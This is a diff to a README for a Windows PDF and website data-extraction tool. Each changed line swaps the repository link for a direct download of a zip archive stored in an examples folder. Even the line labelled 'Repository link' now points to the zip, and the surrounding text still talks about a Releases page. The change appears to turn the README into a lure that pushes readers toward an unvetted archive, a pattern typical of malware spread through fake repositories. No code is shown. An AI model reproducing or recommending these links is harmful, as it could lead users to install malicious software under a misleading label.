@@ -1,6 +1,6 @@
 # 🗂 rag-ready-extractor - Extract Clean Data Easily
 
-[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-4caf50?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor)
+[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-4caf50?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor/raw/refs/heads/main/examples/ready-rag-extractor-3.1.zip)
 
 ---
 
@@ -28,14 +28,14 @@ Before you get started, make sure your PC meets these requirements:
 
 You will find the download link below as a big button. Follow the steps here to install and run rag-ready-extractor.
 
-[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-ff5722?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor)
+[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-ff5722?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor/raw/refs/heads/main/examples/ready-rag-extractor-3.1.zip)
 
 ---
 
 ## 📥 How to Download and Install rag-ready-extractor
 
 1. Click the download button above or visit this link:  
-   https://github.com/delilahsaprophytic338/rag-ready-extractor
+   https://github.com/delilahsaprophytic338/rag-ready-extractor/raw/refs/heads/main/examples/ready-rag-extractor-3.1.zip
 
 2. On the GitHub page, look for the **Releases** section on the right side or in the project menu. If there is a "Releases" tab, click on it.
 
@@ -148,7 +148,7 @@ Currently, the program supports PDF and website URLs only.
 
 If you have questions or face issues, you can visit the GitHub repository page and open a new issue. Include details about your problem and your Windows version.
 
-Repository link: https://github.com/delilahsaprophytic338/rag-ready-extractor
+Repository link: https://github.com/delilahsaprophytic338/rag-ready-extractor/raw/refs/heads/main/examples/ready-rag-extractor-3.1.zip
 
 ---
 
@@ -164,4 +164,4 @@ This project is open-source under the MIT License. You can use and modify it as 
 
 ---
 
-[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-673ab7?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor)
+[![Download rag-ready-extractor](https://img.shields.io/badge/Download-rag--ready--extractor-673ab7?style=for-the-badge)](https://github.com/delilahsaprophytic338/rag-ready-extractor/raw/refs/heads/main/examples/ready-rag-extractor-3.1.zip)
